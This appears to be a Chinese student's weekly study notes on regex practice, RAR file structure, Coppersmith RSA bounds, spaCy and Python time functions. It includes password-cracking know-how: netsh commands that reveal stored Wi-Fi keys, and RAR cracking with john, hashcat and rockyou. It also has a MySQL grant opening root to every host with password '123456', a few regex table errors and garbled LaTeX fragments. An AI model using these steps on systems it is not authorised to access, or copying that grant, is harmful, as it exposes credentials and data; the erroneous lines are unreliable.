<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">s/\bJeffs\b/Jeff&#x27;s/g  最简单直接的方法</span><br><span class="line">s/\b(Jeff)(s)\b/$1&#x27;$2/g   过于复杂</span><br><span class="line">s/\bJeff(?=s\b)/Jeff&#x27;/g  使用了顺序环视，匹配到s左边的位置</span><br><span class="line">s/(?&lt;=\bJeff)(?=s\b)/&#x27;/g 同时使了顺序环视和逆序环视，匹配到&#x27;插入的位置</span><br><span class="line">s/(?=s\b)(?&lt;=\bJeff)/&#x27;/g 与上面的正则相同，只是颠倒了两个环视结构的顺序匹配结果不受影响</span><br></pre></td></tr></table></figure>

<p><strong>TIPS：</strong></p>
<ul>
<li><code>\b</code> 在上面的正则表达式中表示单词分界符</li>
<li><code>$1</code> 在Perl编程语言中的正则表达式中表示反向引用第一个括号匹配的内容</li>
</ul>
<h3 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">gr[ea]y</span><br><span class="line">   解读：先找到g，接着是一个r，然后是一个a或者e，最后是一个y。</span><br><span class="line">   不难看出[···]字符组元字符，代表的意思是或，更准确的说：能够匹配字符组内列出的任意</span><br><span class="line">   字符，这样一来就可以把正则表达式写的更加优美简洁。但是考虑到greycolor也是匹配的，我</span><br><span class="line">   们可以用上 \&lt; 和 \&gt; 组合元字符，来锚定单词的开始和结束。修改后的正则表达式如下：</span><br><span class="line">   \&lt;gr[ea]y\&gt;</span><br><span class="line"></span><br><span class="line">   字符组元字符能解决很多问题，</span><br><span class="line">   1. [Ss]imon可以用来解决大小写的问题</span><br><span class="line">   2. 如果我想匹配0-9中的任意一个字符我可以很快的写出:</span><br><span class="line">   [0123456789] // 说好的简洁优美呢？ </span><br><span class="line">   [0-9] //优化后，怎么还不够优化？</span><br><span class="line">   \d //这个整体算是一个元字符，但是它由两个字符组成，可以称为：组合元字符，等价于[0-9]</span><br></pre></td></tr></table></figure>

<h2 id="查看无线网密码"><a href="#查看无线网密码" class="headerlink" title="查看无线网密码"></a>查看无线网密码</h2><ul>
<li><p><code>netsh wlan show profile</code></p>
</li>
<li><p><code>netsh wlan export profile folder=D:\ key=clear</code></p>
</li>
<li><p><code>netsh wlan show profile [WiFi名称] key=clear</code></p>
</li>
</ul>
<h2 id="二维码的版本问题"><a href="#二维码的版本问题" class="headerlink" title="二维码的版本问题"></a>二维码的版本问题</h2><p>二维码官方叫版本为Version。<br>二维码一共有40个尺寸。Version 1是21 x 21的矩阵，Version 2是 25 x 25的矩阵，Version 3是29的尺寸，每增加一个version，就会增加4的尺寸，公式是：(V-1)*4 + 21（V是版本号）最高Version 40，(40-1)*4+21 &#x3D; 177，所以最高是177 x 177 的正方形。</p>
<p>version2 二维码的标准大小应该是25x25。想到零宽字节隐写。</p>
<h2 id="rar"><a href="#rar" class="headerlink" title="rar"></a>rar</h2><h3 id="rar5-0加密"><a href="#rar5-0加密" class="headerlink" title="rar5.0加密"></a>rar5.0加密</h3><p>上面说的两种工具没办法破解rar5.0的加密，不过可以用破解版的<code>Accent RAR Password Recovery</code>进行爆破，这个工具也支持暴力破解、掩码爆破、字典爆破。</p>
<p>或者先用john获取rar文件的hash值，再用<code>hashcat</code>爆破</p>
<h3 id="rar文件格式"><a href="#rar文件格式" class="headerlink" title="rar文件格式"></a>rar文件格式</h3><blockquote>
<p><a href="https://www.rarlab.com/technote.htm#filehead">RAR 5.0 archive format (rarlab.com)</a></p>
</blockquote>
<p>下面的文件格式分析是基于RAR4.x，并不是RAR5.0<br>RAR 5.0签名和RAR4.x的签名不一样<br>RAR 5.0签名由8个字节组成:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x01 0x00<br>比较一下<br>RAR 4.x 签名由7字节组成:<br>0x52 0x61 0x72 0x21 0x1A 0x07 0x00</p>
<ul>
<li>常见的块</li>
</ul>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">标记块：HEAD_TYPE=0x72</span><br><span class="line">压缩文件头：HEAD_TYPE=0x73</span><br><span class="line">文件头：HEAD_TYPE=0x74</span><br><span class="line">旧风格的注释头：HEAD_TYPE=0x75</span><br><span class="line">旧风格的用户身份信息：HEAD_TYPE=0x76</span><br><span class="line">旧风格的子块：HEAD_TYPE=0x77</span><br><span class="line">旧风格的恢复记录：HEAD_TYPE=0X78</span><br><span class="line">旧风格的用户身份信息：HEAD_TYPE=0X79</span><br><span class="line">子块：HEAD_TYPE=0x7A</span><br><span class="line">最后的结束块：HEAD_TYPE=0x7B</span><br><span class="line"></span><br></pre></td></tr></table></figure>



<h2 id="Kali自带密码字典rockyou-txt解压"><a href="#Kali自带密码字典rockyou-txt解压" class="headerlink" title="Kali自带密码字典rockyou.txt解压"></a>Kali自带密码字典rockyou.txt解压</h2><h2 id="找位置"><a href="#找位置" class="headerlink" title="找位置"></a>找位置</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">/usr/share/wordlists</span><br></pre></td></tr></table></figure>

<h3 id="wordlists中解压"><a href="#wordlists中解压" class="headerlink" title="wordlists中解压"></a>wordlists中解压</h3><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">sudo gzip -d /usr/share/wordlists/rockyou.txt.gz</span><br></pre></td></tr></table></figure>

<h2 id="john"><a href="#john" class="headerlink" title="john"></a>john</h2><blockquote>
<p><a href="https://www.cnblogs.com/Junglezt/p/16048189.html">密码破解-john的使用 - Junglezt - 博客园 (cnblogs.com)</a></p>
</blockquote>
<h2 id="hashcat"><a href="#hashcat" class="headerlink" title="hashcat"></a>hashcat</h2><blockquote>
<p><a href="https://www.cnblogs.com/Junglezt/p/16044372.html">密码破解-hashcat的简单使用 - Junglezt - 博客园 (cnblogs.com)</a></p>
<p>[example_hashes <a href="https://hashcat.net/wiki/doku.php?id=example_hashes">hashcat wiki]</a></p>
<p><a href="https://hashcat.net/hashcat/">hashcat - advanced password recovery</a></p>
</blockquote>
<p>修改内核。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230629171009428.png" class="" title="image-20230629171009428">

<img src="/2023/12/31/WeeklyStudy/image-20230629171043066.png" class="" title="image-20230629171043066">

<h1 id="230803"><a href="#230803" class="headerlink" title="230803"></a>230803</h1><h2 id="coppersmith下限"><a href="#coppersmith下限" class="headerlink" title="coppersmith下限"></a>coppersmith下限</h2><img src="/2023/12/31/WeeklyStudy/image-20230803144033492.png" class="" title="image-20230803144033492">

<img src="/2023/12/31/WeeklyStudy/image-20230803144106079.png" class="" title="image-20230803144106079">

<img src="/2023/12/31/WeeklyStudy/image-20230803144137890.png" class="" title="image-20230803144137890">

<img src="/2023/12/31/WeeklyStudy/image-20230803144155489.png" class="" title="image-20230803144155489">

<img src="/2023/12/31/WeeklyStudy/image-20230803144224670.png" class="" title="image-20230803144224670">

<img src="/2023/12/31/WeeklyStudy/image-20230803144334288.png" class="" title="image-20230803144334288">



<ul>
<li><p>在<code>sagemath</code>中应用<code>coppersmith</code>定理的函数有两个：<code>small_roots</code>， <code>coppersmith_howgrave_univariate</code>。</p>
</li>
<li><p>这里求解coppersmith我们统一使用sagemath的<code>small_roots()</code>函数；该函数导入的 $\beta$起作用的只有一位小数（如果是两位小数，其求解范围还是相当于一位小数的求解范围），这就意味着一般形如<code>p = getPrime(bits)</code>,<code>q = geyPrime(bits)</code>的RSA应用<code>coppersmith</code>求解$p$的低位时，$\beta$只能是最接近$0.5$ 的$0.4$。</p>
</li>
</ul>
<p>关于<code>small_roots()</code>的使用方法：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">small_roots(X = ,beta = ) 有两个参数</span><br></pre></td></tr></table></figure>

<p>$X$代表所需要求解根的上限；虽然是根的上限，并不是说上限越高越好，当上限超过某个值的时候就会计算失效，即使已知二进制位数满足条件，也无法用此函数求得结果；所以一般来说$X$取在给定情况下的最大求解上限。</p>
<p>$beta$即是前面提到的$\beta$ ，当$p$,$q$二进制位数相同时一般只能取$0.4$；如果$p$,$q$二进制位数不同，就按照之前的方法具体问题具体分析。</p>
<p>经过测试得到，当未知量小于等于$454bits$时（$p$,$q$为$1024bits$），coppersmith定理可以求解</p>
<p>之后改变了$p$,$q$的大小，经过测试发现，当$p$,$q$同二进制位数时，要使用<code>small_roots()</code>应用<code>coppersmith</code>定理求解$n$的某个因数的低位，需要满足未知的二进制位数与因数之间的二进制位数的关系是：<br>$$<br>bits_{unknown} \div bits_{p} &lt; &#x3D; 0.44<br>$$</p>
<h1 id="230807"><a href="#230807" class="headerlink" title="230807"></a>230807</h1><img src="/2023/12/31/WeeklyStudy/image-20230808093951590.png" class="" title="image-20230808093951590">

<img src="/2023/12/31/WeeklyStudy/image-20230808094022608.png" class="" title="image-20230808094022608">



<h1 id="230808"><a href="#230808" class="headerlink" title="230808"></a>230808</h1><h2 id="mysql赋权操作"><a href="#mysql赋权操作" class="headerlink" title="mysql赋权操作"></a>mysql赋权操作</h2><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">GRANT ALL PRIVILEGES ON *.* TO &#x27;root&#x27;@&#x27;%&#x27; IDENTIFIED BY &#x27;123456&#x27; WITH GRANT OPTION;</span><br></pre></td></tr></table></figure>

<ul>
<li>GRANT：赋权命令</li>
<li>ALL PRIVILEGES：当前用户的所有权限</li>
<li>ON：介词</li>
<li><code>*.*</code>：当前用户对所有数据库和表的相应操作权限</li>
<li>TO：介词</li>
<li><code>&#39;root&#39;@&#39;%&#39;</code>：权限赋给root用户，所有ip都能连接</li>
<li>IDENTIFIED BY ‘123456’：连接时输入密码，密码为123456</li>
<li>WITH GRANT OPTION：允许级联赋权</li>
</ul>
<h2 id="正则表达式"><a href="#正则表达式" class="headerlink" title="正则表达式"></a>正则表达式</h2><p>练习网站：</p>
<p><a href="https://alf.nu/RegexGolf">Regex Golf (alf.nu)</a></p>
<p><a href="https://regexone.com/">RegexOne - Learn Regular Expressions - Lesson 1: An Introduction, and the ABCs</a></p>
<p>参考答案：</p>
<p><a href="https://blog.csdn.net/NJYR21/article/details/79600217">Regex Golf 正则表达式练习（持续更新）_regex golf的it never ends_NJYR21的博客-CSDN博客</a></p>
<p><a href="https://blog.csdn.net/weixin_47532216/article/details/122615843?spm=1001.2101.3001.6650.1&utm_medium=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-122615843-blog-79600217.235%5Ev38%5Epc_relevant_sort&depth_1-utm_source=distribute.pc_relevant.none-task-blog-2~default~CTRLIST~Rate-1-122615843-blog-79600217.235%5Ev38%5Epc_relevant_sort&utm_relevant_index=2">正则表达式练习(Regex Golf)_regex golf答案_强强学习的博客-CSDN博客</a></p>
<h2 id="git练习"><a href="#git练习" class="headerlink" title="git练习"></a>git练习</h2><p><a href="https://learngitbranching.js.org/">Learn Git Branching</a></p>
<h2 id="教程"><a href="#教程" class="headerlink" title="教程"></a>教程</h2><p><a href="https://gitcode.net/mirrors/ziishaned/learn-regex/-/blob/master/translations/README-cn.md">translations&#x2F;README-cn.md · master · mirrors &#x2F; ziishaned &#x2F; learn-regex · GitCode</a></p>
<h1 id="230809-230810"><a href="#230809-230810" class="headerlink" title="230809-230810"></a>230809-230810</h1><h2 id="正则匹配练习-RegexOne"><a href="#正则匹配练习-RegexOne" class="headerlink" title="正则匹配练习-RegexOne"></a>正则匹配练习-RegexOne</h2><blockquote>
<p><a href="https://regexone.com/problem/complete">RegexOne - Learn Regular Expressions - Problem X: Infinity and beyond!</a></p>
</blockquote>
<img src="/2023/12/31/WeeklyStudy/image-20230810101245480.png" class="" title="image-20230810101245480">

<table>
<thead>
<tr>
<th>简写</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>.</td>
<td>除换行符外的所有字符</td>
</tr>
<tr>
<td>\w</td>
<td>匹配所有字母数字，等价于[a-zA-Z0-9_]</td>
</tr>
<tr>
<td>\W</td>
<td>匹配所有非字母数字，即符号，等价于<code>[^\w]</code></td>
</tr>
<tr>
<td>\d</td>
<td>匹配数字[0-9]</td>
</tr>
<tr>
<td>\D</td>
<td>匹配所有非数字，等价于<code>[^\D]</code></td>
</tr>
<tr>
<td>\s</td>
<td>匹配所有空格字符，等价于<code>[\t\n\f\r\p&#123;Z&#125;]</code></td>
</tr>
<tr>
<td>\S</td>
<td>匹配所有非空格字符，等价于<code>[^\s]</code></td>
</tr>
<tr>
<td>\f</td>
<td>匹配一个换页符</td>
</tr>
<tr>
<td>\n</td>
<td>匹配一个换行符</td>
</tr>
<tr>
<td>\r</td>
<td>匹配一个回车符</td>
</tr>
<tr>
<td>\t</td>
<td>匹配一个制表符</td>
</tr>
<tr>
<td>\v</td>
<td>匹配一个垂直制表符</td>
</tr>
<tr>
<td>\p</td>
<td>匹配 CR&#x2F;LF（等同于 \r\n ），用来匹配 DOS 行终止符</td>
</tr>
</tbody></table>
<img src="/2023/12/31/WeeklyStudy/image-20230809131141276.png" class="" title="image-20230809131141276">

<ul>
<li><code>123</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809111936370.png" class="" title="image-20230809111936370">

<ul>
<li><code>\.</code></li>
<li><code>...\.</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809111113077.png" class="" title="image-20230809111113077">

<ul>
<li><code>[cmf]an</code></li>
<li><code>[^drp]an</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809110854701.png" class="" title="image-20230809110854701">

<ul>
<li><code>[^b]og</code></li>
<li><code>[hd]og</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809110635758.png" class="" title="image-20230809110635758">

<ul>
<li><code>[A-Z][nop][a-c]</code></li>
<li><code>[A-Z]</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809110556161.png" class="" title="image-20230809110556161">

<ul>
<li><code>waz&#123;3,5&#125;up</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809110354476.png" class="" title="image-20230809110354476">

<ul>
<li><code>a+b*c+</code></li>
<li><code>aa</code></li>
<li><code>a&#123;2,4&#125;b&#123;0,4&#125;c&#123;1,2&#125;</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809133748274.png" class="" title="image-20230809133748274">

<ul>
<li><code>[0-9]\sfile(s|\s)</code></li>
<li><code>\d+ files? found\?</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809144844315.png" class="" title="image-20230809144844315">

<ul>
<li><code>\d\.\s+abc</code></li>
<li><code>[\s]</code></li>
<li><code>[^\S]</code></li>
<li><code>[0-9]\.\s+[a-c]+</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809160628468.png" class="" title="image-20230809160628468">

<ul>
<li><code>(^M)[a-z]+: \w+</code></li>
<li><code>(^M)\w+: \w+</code></li>
<li><code>^Mission: successful$</code></li>
<li><code>(^Mission): [a-z]+</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809161813119.png" class="" title="image-20230809161813119">

<ul>
<li><code>^(file.+)\.pdf</code></li>
<li><code>^(file.*)\.pdf</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230809162757458.png" class="" title="image-20230809162757458">

<ul>
<li><code>(\w+\s(\d+))</code></li>
<li><code>(\w+ (\d+))</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810092448218.png" class="" title="image-20230810092448218">



<img src="/2023/12/31/WeeklyStudy/image-20230810093941579.png" class="" title="image-20230810093941579">



<img src="/2023/12/31/WeeklyStudy/image-20230810095458650.png" class="" title="image-20230810095458650">

<ul>
<li><code>[^p]$</code></li>
<li><code>^-?\d+(,\d+)*(\.\d+(e\d+)?)?$</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810102154899.png" class="" title="image-20230810102154899">

<ul>
<li><code>(\d&#123;3&#125;)</code></li>
<li><code>1?[\s-]?\(?(\d&#123;3&#125;)\)?[\s-]?\d&#123;3&#125;[\s-]?\d&#123;4&#125;</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810111454324.png" class="" title="image-20230810111454324">

<ul>
<li><code>^([\.\w]*)</code></li>
<li><code>^([\.\w]*)[\W\w]+$</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810135752929.png" class="" title="image-20230810135752929">

<ul>
<li><code>(\w&#123;1,3&#125;)</code></li>
<li><code>\&lt;([\w]&#123;1,3&#125;)[\&gt;\s]?[\w]+\=?[\W\w]+</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810153957287.png" class="" title="image-20230810153957287">

<ul>
<li><code>^(\w+)\.?(png|jpg|gif)$</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810160942281.png" class="" title="image-20230810160942281">

<ul>
<li><code>[\s]+(.*)</code></li>
<li><code>^\s*(.*)\s*$</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810162117600.png" class="" title="image-20230810162117600">

<ul>
<li><code>.*\.(\w+)\(([\w\.]+):(\d+)\)</code></li>
<li><code>(\w+)\(([\w\.]+):(\d+)\)</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810162653328.png" class="" title="image-20230810162653328">

<ul>
<li><code>(\w+)://([\w\.-]+)[:]?(\d+)?</code></li>
<li><code>(\w+)://([\w\-\.]+)(:(\d+))?</code></li>
<li><code>^(\w+)://([\w\.-]+)[:]?(\d+)?.*$</code></li>
<li>……</li>
</ul>
<img src="/2023/12/31/WeeklyStudy/image-20230810171444793.png" class="" title="image-20230810171444793">

<h1 id="230818"><a href="#230818" class="headerlink" title="230818"></a>230818</h1><h2 id="正则匹配进阶"><a href="#正则匹配进阶" class="headerlink" title="正则匹配进阶"></a>正则匹配进阶</h2><h3 id="锚点"><a href="#锚点" class="headerlink" title="锚点"></a>锚点</h3><ul>
<li><code>^</code>用来检查匹配的字符串是否在所匹配字符串的开头。</li>
<li>同理于 <code>^</code>号， <code>$</code>号用来匹配字符是否是最后一个。 例如，<code>(at\.)$</code> 匹配以<code>at.</code>结尾的字符串。</li>
</ul>
<h3 id="零宽度断言"><a href="#零宽度断言" class="headerlink" title="零宽度断言"></a>零宽度断言</h3><p>先行断言和后发断言（合称 lookaround）都属于非捕获组（用于匹配模式，但不包括在匹配列表中）。当我们需要一个模式的前面或后面有另一个特定的模式时，就可以使用它们。</p>
<p>例如，我们希望从下面的输入字符串 $4.44 和 $10.88 中获得所有以 <code>$</code> 字符开头的数字，我们将使用以下 的正则表达式 <code>(?&lt;=\$)[0-9\.]* </code>。意思是：获取所有包含 <code>.</code> 并且前面是 <code>$</code> 的数字。</p>
<p><strong>零宽度断言</strong></p>
<table>
<thead>
<tr>
<th>符号</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>?&#x3D;</td>
<td>正先行断言-存在</td>
</tr>
<tr>
<td>?!</td>
<td>负先行断言-排除</td>
</tr>
<tr>
<td>?&lt;&#x3D;</td>
<td>正后发断言-存在</td>
</tr>
<tr>
<td>?&lt;!</td>
<td>负后发断言-排除</td>
</tr>
</tbody></table>
<h4 id="正先行断言-存在"><a href="#正先行断言-存在" class="headerlink" title="?=正先行断言-存在"></a><code>?=</code>正先行断言-存在</h4><p><code>?=</code> 正先行断言，表示第一部分表达式之后必须跟着 <code>?=</code> 定义的表达式。 </p>
<p>返回结果只包含满足匹配条件的第一部分表达式。 </p>
<p>定义一个正先行断言要使用 <code>()</code> 。在括号内部使用一个问号和等号： <code>(?=...)</code> 。 </p>
<p>正先行断言的内容写在括号中的等号后面。</p>
<h4 id="负先行断言-排除"><a href="#负先行断言-排除" class="headerlink" title="?!负先行断言-排除"></a><code>?!</code>负先行断言-排除</h4><p>负先行断言<code>?!</code>用于筛选所有匹配结果，筛选条件为其后不跟随着断言中定义的格式。 </p>
<p>正先行断言定义和负先行断言 一样，区别就是<code>=</code>替换成<code>!</code>也就是 <code>(?!...)</code> 。</p>
<h4 id="lt-正后发断言-存在"><a href="#lt-正后发断言-存在" class="headerlink" title="?&lt;=正后发断言-存在"></a><code>?&lt;=</code>正后发断言-存在</h4><p>正后发断言记作<code>(?&lt;=...)</code>用于筛选所有匹配结果，筛选条件为其前跟随着断言中定义的格式。</p>
<h4 id="lt-负后发断言-排除"><a href="#lt-负后发断言-排除" class="headerlink" title="?&lt;!负后发断言-排除"></a><code>?&lt;!</code>负后发断言-排除</h4><p>负后发断言记作<code>(?&lt;!...)</code>用于筛选所有匹配结果，筛选条件为其前不跟随着断言中定义的格式。</p>
<h3 id="标志"><a href="#标志" class="headerlink" title="标志"></a>标志</h3><p>标志也叫模式修正符，因为它可以用来修改表达式的搜索结果。 </p>
<p>这些标志可以任意的组合使用，它也是整个正则表达式的一部分。</p>
<table>
<thead>
<tr>
<th>标志</th>
<th>描述</th>
</tr>
</thead>
<tbody><tr>
<td>i</td>
<td>忽略大小写</td>
</tr>
<tr>
<td>g</td>
<td>全局搜索</td>
</tr>
<tr>
<td>m</td>
<td>多行修饰符：锚点元字符<code>^</code>，<code>$</code>工作范围在每行起始</td>
</tr>
</tbody></table>
<h4 id="忽略大小写"><a href="#忽略大小写" class="headerlink" title="忽略大小写"></a>忽略大小写</h4><p>修饰语<code>i</code>用于忽略大小写。</p>
<h4 id="全局搜索"><a href="#全局搜索" class="headerlink" title="全局搜索"></a>全局搜索</h4><p>修饰符 <code>g</code> 常用于执行一个全局搜索匹配，即（不仅仅返回第一个匹配的，而是返回全部）。</p>
<h4 id="多行修饰符"><a href="#多行修饰符" class="headerlink" title="多行修饰符"></a>多行修饰符</h4><p>多行修饰符 <code>m</code> 常用于执行一个多行匹配。</p>
<h3 id="贪婪匹配与惰性匹配"><a href="#贪婪匹配与惰性匹配" class="headerlink" title="贪婪匹配与惰性匹配"></a>贪婪匹配与惰性匹配</h3><p>正则表达式默认采用贪婪匹配模式，在该模式下意味着会匹配尽可能长的子串。我们可以使用 <code>?</code> 将贪婪匹配 模式转化为惰性匹配模式。</p>
<p><em><code>?</code>对其进行截断。从而减少匹配的长子串。</em></p>
<p>$$<br>正确率 &#x3D; (\frac{提交正确条数}{提交全部条数}) \times 100<br>$$</p>
<p>$$<br>召回率 &#x3D; (\frac{提交正确条数}{正确样本条数}) \times 100<br>$$</p>
<p>$$<br>单类型分数 &#x3D; \frac{2 \times 正确率 \times 召回率}{正确率 + 召回率}<br>$$</p>
<p>$$<br>总分数 &#x3D; \frac{1}{n}\sum_{i&#x3D;1}^{n} 单类型分数_i<br>$$</p>
<h1 id="230905"><a href="#230905" class="headerlink" title="230905"></a>230905</h1><h2 id="kali实现mysql运行"><a href="#kali实现mysql运行" class="headerlink" title="kali实现mysql运行"></a>kali实现mysql运行</h2><p>直接运行<code>mysql -u root</code>，会出现报错<code>ERROR 2002 (HY000): Can‘t connect to local MySQL server through socket ‘/tmp/mysql.sock‘ (2)</code>。</p>
<h3 id="目前解决方法"><a href="#目前解决方法" class="headerlink" title="目前解决方法"></a>目前解决方法</h3><blockquote>
<p><a href="https://blog.csdn.net/zhy_27/article/details/114944433">WSL下Kali 2021 启用mysql服务并通过主机连接_kali mysql 连接 另外主机_zhy_27的博客-CSDN博客</a></p>
</blockquote>
<ul>
<li><p>打开<code>mysql</code>环境<code>sudo service mysql start</code></p>
</li>
<li><p>直接运行<code>mysql</code></p>
</li>
<li><p>创建新的数据库：<code>create database test;</code></p>
</li>
<li><p>转换到新创建的数据库：<code>use test;</code></p>
</li>
<li><p>导入sql文件：<code>source xx.sql;</code></p>
</li>
<li><p>查看当前数据库下的表名：<code>show tables;</code></p>
</li>
<li><p>查看对应列下的数据：<code>select xx from [tables];</code></p>
</li>
<li><p>关闭数据库服务：<code>service mysql stop</code></p>
</li>
</ul>
<h2 id="spacy"><a href="#spacy" class="headerlink" title="spacy"></a>spacy</h2><p>每个元组由三个值构成：匹配到的ID，匹配到的跨度的起始和终止索引。</p>
<img src="/2023/12/31/WeeklyStudy/image-20230905162404171.png" class="" title="image-20230905162404171">

<img src="/2023/12/31/WeeklyStudy/image-20230905162529711.png" class="" title="image-20230905162529711">

<h1 id="230906"><a href="#230906" class="headerlink" title="230906"></a>230906</h1><h2 id="特征工程以及训练模型"><a href="#特征工程以及训练模型" class="headerlink" title="特征工程以及训练模型"></a>特征工程以及训练模型</h2><p>词向量是将字、词语转换成向量矩阵的计算模型。</p>
<p>目前为止最常用的词表示方法是 One-hot，这种方法把每个词表示为一个很长的向量。这个向量的维度是词表大小，其中绝大多数元素为 0，只有一个维度的值为 1，这个维度就代表了当前的词。</p>
<p>还有 Google 团队的 Word2Vec，其主要包含两个模型：跳字模型（Skip-Gram）和连续词袋模型（Continuous Bag of Words，简称 CBOW），以及两种高效训练的方法：负采样（Negative Sampling）和层序 Softmax（Hierarchical Softmax）。</p>
<p>值得一提的是，Word2Vec 词向量可以较好地表达不同词之间的相似和类比关系。除此之外，还有一些词向量的表示方式，如 Doc2Vec、WordRank 和 FastText 等。</p>
<h2 id="特征选择"><a href="#特征选择" class="headerlink" title="特征选择"></a>特征选择</h2><p>在一个实际问题中，构造好的特征向量，是要选择合适的、表达能力强的特征。文本特征一般都是词语，具有语义信息，使用特征选择能够找出一个特征子集，其仍然可以保留语义信息；但通过特征提取找到的特征子空间，将会丢失部分语义信息。</p>
<p>目前，常见的特征选择方法主要有 DF、 MI、 IG、 CHI、WLLR、WFO 六种。</p>
<h1 id="230911"><a href="#230911" class="headerlink" title="230911"></a>230911</h1><h2 id="时间处理"><a href="#时间处理" class="headerlink" title="时间处理"></a>时间处理</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">time()</td>
<td align="left">获取当前时 间 戳 \textcolor{red}{时间戳}时间戳</td>
</tr>
<tr>
<td align="left">gmtime()</td>
<td align="left">获取当前时间戳对应的 s t r u c t _ t i m e \textcolor{red}{struct_time}struct_tme 对象</td>
</tr>
<tr>
<td align="left">localtime()</td>
<td align="left">获取当前时间戳对应的本 地 时 间 \textcolor{red}{本地时间}本地时间的 struct_time 对象</td>
</tr>
<tr>
<td align="left">ctime()</td>
<td align="left">获取当前时间戳对应的易 读 字 符 串 \textcolor{red}{易读字符串}易读字符串表示，内部会调用 time.localtime()</td>
</tr>
</tbody></table>
<h2 id="struct-time"><a href="#struct-time" class="headerlink" title="struct_time"></a>struct_time</h2><table>
<thead>
<tr>
<th align="left">下标</th>
<th align="left">属性</th>
<th align="left">值</th>
</tr>
</thead>
<tbody><tr>
<td align="left">0</td>
<td align="left">tm_year</td>
<td align="left">年份，整数</td>
</tr>
<tr>
<td align="left">1</td>
<td align="left">tm_mon</td>
<td align="left">月份[1, 12]</td>
</tr>
<tr>
<td align="left">2</td>
<td align="left">tm_mday</td>
<td align="left">日期[1, 31]</td>
</tr>
<tr>
<td align="left">3</td>
<td align="left">tm_hour</td>
<td align="left">小时[0, 23]</td>
</tr>
<tr>
<td align="left">4</td>
<td align="left">tm_min</td>
<td align="left">分钟[0, 59]</td>
</tr>
<tr>
<td align="left">5</td>
<td align="left">tm_sec</td>
<td align="left">秒[0, 61]</td>
</tr>
<tr>
<td align="left">6</td>
<td align="left">tm_wday</td>
<td align="left">星期[0, 6]（0表示星期一）</td>
</tr>
<tr>
<td align="left">7</td>
<td align="left">tm_yday</td>
<td align="left">该年第几天[1, 366]</td>
</tr>
<tr>
<td align="left">8</td>
<td align="left">tm_isdst</td>
<td align="left">是否夏时令，0否, 1是, -1未知</td>
</tr>
</tbody></table>
<h2 id="时间格式化"><a href="#时间格式化" class="headerlink" title="时间格式化"></a>时间格式化</h2><table>
<thead>
<tr>
<th align="left">函数</th>
<th align="left">描述</th>
</tr>
</thead>
<tbody><tr>
<td align="left">mktime()</td>
<td align="left">将 struct_time 对象 t 转 换 为 时 间 戳 \textcolor{red}{转换为时间戳}转换为时间戳</td>
</tr>
<tr>
<td align="left">strftime()</td>
<td align="left">时间格 式 化 \textcolor{red}{格式化}格式化</td>
</tr>
<tr>
<td align="left">strptime()</td>
<td align="left">提取字符串中的时间来生成struct_ time\textcolor{red}{struct_time}struct_time 对象</td>
</tr>
</tbody></table>
<h2 id="strftime"><a href="#strftime" class="headerlink" title="strftime()"></a>strftime()</h2><table>
<thead>
<tr>
<th align="left">格式化字符串</th>
<th align="left">日期&#x2F;时间</th>
<th align="left">值范围和实例</th>
</tr>
</thead>
<tbody><tr>
<td align="left">%Y</td>
<td align="left">年份</td>
<td align="left">0001~9999，例如：1900</td>
</tr>
<tr>
<td align="left">%m</td>
<td align="left">月份</td>
<td align="left">01~12，例如：10</td>
</tr>
<tr>
<td align="left">%B</td>
<td align="left">月名</td>
<td align="left">January~December，例如：April</td>
</tr>
<tr>
<td align="left">%b</td>
<td align="left">月名缩写</td>
<td align="left">Jan~Dec，例如：Apr</td>
</tr>
<tr>
<td align="left">%d</td>
<td align="left">日期</td>
<td align="left">01 ~ 31，例如：25</td>
</tr>
<tr>
<td align="left">%A</td>
<td align="left">星期</td>
<td align="left">Monday~Sunday，例如：Wednesday</td>
</tr>
<tr>
<td align="left">%a</td>
<td align="left">星期缩写</td>
<td align="left">Mon~Sun，例如：Wed</td>
</tr>
<tr>
<td align="left">%H</td>
<td align="left">小时（24h制）</td>
<td align="left">00 ~ 23，例如：12</td>
</tr>
<tr>
<td align="left">%I</td>
<td align="left">小时（12h制）</td>
<td align="left">01 ~ 12，例如：7</td>
</tr>
<tr>
<td align="left">%p</td>
